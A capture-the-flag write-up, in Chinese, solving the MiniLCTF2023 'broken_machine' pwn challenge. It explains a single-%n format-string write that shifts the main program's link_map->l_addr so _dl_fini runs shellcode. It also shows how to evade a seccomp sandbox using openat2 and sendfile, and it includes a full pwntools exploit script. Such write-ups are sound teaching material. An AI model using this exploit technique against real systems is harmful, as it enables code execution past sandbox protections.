# MiniLCTF2023 - broken_machine

## 题目简述

程序把输入保存到全局 `buf`，以它为格式串执行 `sprintf(addr, buf)`，然后安装 seccomp 并调用固定地址 `0x1000`。Linux 的 `mmap_min_addr` 使低地址映射提示通常被提升到 `0x10000`，因此 `call 0x1000` 必然触发 SIGSEGV；自定义处理器调用 `exit`。二进制为 Full RELRO、Canary、NX、无 PIE，输入中最多只能出现一个字符 `n`。

利用目标是用唯一一次 `%n` 劫持动态链接器退出清理路径，再以 `openat2 + sendfile` 绕过 seccomp。

## 解题过程

`sprintf` 的格式串位于 `.bss`，但第 35 个变参位置恰好残留主程序 `link_map->l_addr` 的地址，因此 `%35$n` 可以修改它。SIGSEGV 处理器执行 `exit` 后，`_dl_fini` 按下式定位 `.fini_array`：

$$
array=l\_addr+l\_info[DT\_FINI\_ARRAY].d\_ptr.
$$

无 PIE 主程序的 `l_addr` 原为 0。把它改成一个精确偏移，就能让 `array` 指向 `.bss` 中由输入布置的 `p64(0x10000)`，从而在退出阶段调用实际映射页上的 shellcode。格式化后的输出本身正写到 `0x10000`，所以 shellcode已经在那里。

沙箱禁用了 `open`、`openat`、所有 `read` 变体、`execve`、`mmap` 等，但漏掉了 `openat2` 和 `sendfile`。前者打开 `/flag`，后者把文件描述符直接复制到 stdout，无需 `read`。

```python
from pwn import *

context.arch = "amd64"
elf = ELF("./pwn")
io = remote(HOST, PORT)

shellcode = shellcraft.push(1)   # open_how.resolve
shellcode += shellcraft.push(0)  # open_how.mode
shellcode += shellcraft.push(0)  # open_how.flags
shellcode += "push rsp; pop rdx"
shellcode += shellcraft.pushstr("/flag")
shellcode += shellcraft.syscall("SYS_openat2", 0, "rsp", "rdx", 0x18)
shellcode += shellcraft.sendfile(1, 3, 0, 0x50)
payload = asm(shellcode)

slot = elf.bss(0x40 + len(payload) + 0x17)
fini = elf.sym.__do_global_dtors_aux_fini_array_entry
count = slot - fini

payload += f"%{count - len(payload)}c%35$n".encode().ljust(0x17, b"A")
payload += p64(0x10000)
io.sendline(payload)
io.interactive()
```

shellcode 还必须避免 `0x00`，否则 `sprintf` 会提前停止。官方同时指出一个非预期简化：若直接让 `sprintf` 在安装 seccomp 之前段错误，也可能绕开沙箱；上面的路线则完整利用了预期的 `_dl_fini` 偏移。

## 方法总结

异常处理和正常退出同样是可利用控制流。一次受限写不一定要覆盖 GOT；动态链接器的 `link_map` 会参与析构地址计算，修改基址即可整体平移 `.fini_array`。分析 seccomp 时要按能力找等价系统调用：`openat2` 是 `openat` 的替代，`sendfile` 是“内核内复制”形式的读出原语。
